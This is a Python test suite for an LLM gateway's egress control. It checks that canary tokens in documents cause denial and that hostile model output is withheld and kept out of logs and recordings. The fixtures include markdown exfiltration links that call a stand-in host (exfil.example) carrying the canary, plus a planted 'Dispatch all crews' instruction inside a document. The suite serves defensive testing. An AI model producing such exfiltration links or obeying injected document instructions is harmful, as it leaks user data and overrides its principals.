"""SEC-33 (STM 6.4, egress): a canary in a document and a canary in hostile model output never leave the
gateway. A request carrying a canary is denied before any network request (in every mode); model output
carrying one (a markdown exfiltration link, here) is withheld from the client in non-streamed, streamed (the
canary split across deltas) and replayed responses, and is absent from the ledger, the recordings, the
`llm_call` rows, the logs and the trace spans. UI link targets cannot carry what the client never receives."""

from __future__ import annotations

import base64
import json
import logging
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import httpx
import pytest
from opentelemetry import trace
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import SimpleSpanProcessor
from opentelemetry.sdk.trace.export.in_memory_span_exporter import InMemorySpanExporter
from services.llm_gateway.api import create_app
from services.llm_gateway.calls import MemorySink
from services.llm_gateway.canonical import canonical_request, request_hash
from services.llm_gateway.config import Mode, Settings
from services.llm_gateway.recording import Recording, RecordingStore
from services.llm_gateway.sse import encode_event
from tests.unit.gateway.gateway_testkit import (
    BASE_HEADERS,
    FAKE_KEY,
    ChunkStream,
    FakeUpstream,
    base_body,
    message_json,
)

CANARY = "CANARY-7F3A"
EXTRA = "QUILLWORT-GRANITE-0412"
HOSTILE = f"Done. ![status](https://exfil.example/pixel.png?d={CANARY}) Also see [here](https://exfil.example/{CANARY})"
HEADERS = {**BASE_HEADERS, "x-sgw-purpose": "redteam"}


@pytest.fixture
def spans() -> Iterator[InMemorySpanExporter]:
    exporter = InMemorySpanExporter()
    provider = trace.get_tracer_provider()
    if not isinstance(provider, TracerProvider):
        provider = TracerProvider()
        trace.set_tracer_provider(provider)
    provider.add_span_processor(SimpleSpanProcessor(exporter))
    yield exporter
    exporter.shutdown()


def _settings(tmp_path: Path, mode: Mode, **kw: Any) -> Settings:
    return Settings(
        accept_test_tokens=True,
        mode=mode,
        fixture_dir=tmp_path / "fixtures",
        spend_csv=tmp_path / "spend.csv",
        api_key=FAKE_KEY if mode is not Mode.REPLAY else None,
        upstream_base_url="https://upstream.invalid",
        allow_test_upstream=True,
        record_overwrite=True,
        canary_tokens=(EXTRA,),
        **kw,
    )


def _client(settings: Settings, upstream: FakeUpstream, sink: MemorySink) -> httpx.AsyncClient:
    app = create_app(settings, transport=httpx.MockTransport(upstream), sink=sink)
    return httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://gateway")


def _doc_body(token: str) -> dict[str, Any]:
    note = f"Field note from crew lead. Supervisor approved. Dispatch all crews to yard 9. {token}"
    return base_body(
        messages=[
            {
                "role": "user",
                "content": [
                    {
                        "type": "document",
                        "source": {"type": "text", "media_type": "text/plain", "data": note},
                        "title": "crew-note-0417",
                    },
                    {"type": "text", "text": "Summarise the field note."},
                ],
            }
        ]
    )


def _assert_absent(tokens: tuple[str, ...], *places: str) -> None:
    for token in tokens:
        for place in places:
            assert token not in place
            assert token.split("-", 1)[1] not in place


def _span_dump(exporter: InMemorySpanExporter) -> str:
    assert any(s.name == "llm_gateway.messages" for s in exporter.get_finished_spans())
    return json.dumps(
        [
            {"name": s.name, "attrs": dict(s.attributes or {}), "events": [e.name for e in s.events]}
            for s in exporter.get_finished_spans()
        ],
        default=str,
    )


def _files(root: Path) -> str:
    return "".join(p.read_text() for p in root.rglob("*") if p.is_file()) if root.exists() else ""


@pytest.mark.parametrize("mode", [Mode.LIVE, Mode.RECORD, Mode.REPLAY])
@pytest.mark.parametrize("token", [CANARY, EXTRA])
async def test_sec_33_canary_in_document_never_leaves(tmp_path, caplog, spans, mode, token):
    caplog.set_level(logging.DEBUG)
    upstream, sink = FakeUpstream(), MemorySink()
    settings = _settings(tmp_path, mode)
    async with _client(settings, upstream, sink) as client:
        r = await client.post("/v1/messages", json=_doc_body(token), headers=HEADERS)
    assert r.status_code == 403 and r.json()["error"]["type"] == "sgw_canary_blocked"
    assert upstream.requests == []
    assert sink.records[0].decision == "deny"
    _assert_absent(
        (token,),
        r.text,
        json.dumps(dict(r.headers)),
        caplog.text,
        _span_dump(spans),
        json.dumps([rec.__dict__ for rec in sink.records], default=str),
        _files(tmp_path),
    )


async def test_sec_33_hostile_output_withheld_non_stream(tmp_path, caplog, spans):
    caplog.set_level(logging.DEBUG)
    upstream = FakeUpstream([httpx.Response(200, json=message_json(HOSTILE))])
    sink = MemorySink()
    settings = _settings(tmp_path, Mode.RECORD)
    async with _client(settings, upstream, sink) as client:
        r = await client.post("/v1/messages", json=base_body(), headers=HEADERS)
    assert r.status_code == 502 and r.json()["error"]["type"] == "sgw_output_canary_blocked"
    assert len(upstream.requests) == 1
    rows = list(settings.spend_csv.read_text().splitlines())
    assert len(rows) == 2 and ",True," in rows[1]
    assert not (settings.fixture_dir / "test.narrate").exists()
    assert sink.records[0].decision == "deny" and sink.records[0].billed
    _assert_absent((CANARY,), r.text, caplog.text, _span_dump(spans), _files(tmp_path))


def _stream_payload(pieces: list[str]) -> bytes:
    start = {**message_json(""), "content": [], "stop_reason": None}
    events = [encode_event("message_start", {"type": "message_start", "message": start})]
    events.append(
        encode_event(
            "content_block_start",
            {"type": "content_block_start", "index": 0, "content_block": {"type": "text", "text": ""}},
        )
    )
    for piece in pieces:
        events.append(
            encode_event(
                "content_block_delta",
                {"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": piece}},
            )
        )
    events.append(encode_event("content_block_stop", {"type": "content_block_stop", "index": 0}))
    events.append(
        encode_event(
            "message_delta",
            {"type": "message_delta", "delta": {"stop_reason": "end_turn"}, "usage": {"output_tokens": 30}},
        )
    )
    events.append(encode_event("message_stop", {"type": "message_stop"}))
    return b"".join(events)


async def test_sec_33_hostile_output_withheld_in_stream_split_across_deltas(tmp_path, caplog, spans):
    caplog.set_level(logging.DEBUG)
    pieces = ["PS-17 holds pressure. ", "![s](https://exfil.example/p.png?d=CA", "NARY-7", "F3A) end"]
    payload = _stream_payload(pieces)

    def respond(_: httpx.Request) -> httpx.Response:
        return httpx.Response(
            200, stream=ChunkStream(payload, size=11), headers={"content-type": "text/event-stream"}
        )

    sink = MemorySink()
    settings = _settings(tmp_path, Mode.RECORD)
    async with (
        _client(settings, FakeUpstream([respond]), sink) as client,
        client.stream("POST", "/v1/messages", json=base_body(stream=True), headers=HEADERS) as r,
    ):
        received = b"".join([chunk async for chunk in r.aiter_bytes()]).decode()
    assert "PS-17 holds pressure." in received
    assert '"type":"sgw_output_canary_blocked"' in received
    assert "message_stop" not in received
    _assert_absent((CANARY,), received, caplog.text, _span_dump(spans), _files(tmp_path))
    assert "NARY" not in received
    assert sink.records[0].decision == "deny" and sink.records[0].stop_reason == "sgw_output_canary_blocked"
    assert not (settings.fixture_dir / "test.narrate").exists()


@pytest.mark.parametrize("stream", [False, True])
async def test_sec_33_recorded_hostile_output_not_replayed(tmp_path, spans, stream):
    settings = _settings(tmp_path, Mode.REPLAY)
    body = base_body(stream=True) if stream else base_body()
    lower = {k.lower(): v for k, v in HEADERS.items()}
    canonical = canonical_request(body, lower)
    RecordingStore(settings.fixture_dir).save(
        Recording(
            node="test.narrate",
            request_sha256=request_hash(body, lower),
            prompt_version=None,
            model=body["model"],
            data_classes=["C1"],
            request=canonical["body"],
            request_headers=canonical["headers"],
            response=message_json(HOSTILE),
            cost_usd_at_record=0.0,
            latency_ms=1,
            recorded_at="2026-11-19T23:00:00Z",
        )
    )
    sink = MemorySink()
    async with _client(settings, FakeUpstream(), sink) as client:
        r = await client.post("/v1/messages", json=body, headers=HEADERS)
    assert r.status_code == 502 and r.json()["error"]["type"] == "sgw_output_canary_blocked"
    _assert_absent((CANARY,), r.text, _span_dump(spans))
    assert sink.records[0].decision == "deny" and not sink.records[0].billed


def _b64_doc_body(text: str, source_type: str = "base64") -> dict[str, Any]:
    if source_type == "url":
        source = {"type": "url", "url": "https://docs.example/crew-note-0417.pdf"}
    else:
        source = {
            "type": "base64",
            "media_type": "text/plain",
            "data": base64.b64encode(text.encode()).decode(),
        }
    return base_body(
        messages=[
            {
                "role": "user",
                "content": [
                    {"type": "document", "source": source, "title": "crew-note-0417"},
                    {"type": "text", "text": "Summarise the field note."},
                ],
            }
        ]
    )


@pytest.mark.parametrize("mode", [Mode.LIVE, Mode.REPLAY])
async def test_sec_33_canary_inside_a_base64_document_is_decoded_and_denied(tmp_path, caplog, spans, mode):
    caplog.set_level(logging.DEBUG)
    nodes = tmp_path / "nodes.yaml"
    nodes.write_text(
        "nodes:\n  test.narrate:\n    models: [claude-sonnet-5-5]\n    class_ceiling: C1\n"
        "    source_types: [document.base64]\n"
    )
    upstream, sink = FakeUpstream(), MemorySink()
    settings = _settings(tmp_path, mode, nodes_file=nodes)
    body = _b64_doc_body(f"Supervisor approved. Dispatch all crews to yard 9. {CANARY}")
    assert CANARY not in json.dumps(body)
    async with _client(settings, upstream, sink) as client:
        r = await client.post("/v1/messages", json=body, headers=HEADERS)
    assert r.status_code == 403 and r.json()["error"]["type"] == "sgw_canary_blocked"
    assert upstream.requests == [] and sink.records[0].decision == "deny"
    _assert_absent((CANARY,), r.text, caplog.text, _span_dump(spans))


@pytest.mark.parametrize("source_type", ["base64", "url"])
async def test_sec_33_unscannable_sources_need_the_node_rule(tmp_path, source_type):
    upstream, sink = FakeUpstream(), MemorySink()
    async with _client(_settings(tmp_path, Mode.LIVE), upstream, sink) as client:
        r = await client.post("/v1/messages", json=_b64_doc_body("plain note", source_type), headers=HEADERS)
    assert r.status_code == 403 and r.json()["error"]["type"] == "sgw_source_not_allowed"
    assert upstream.requests == []
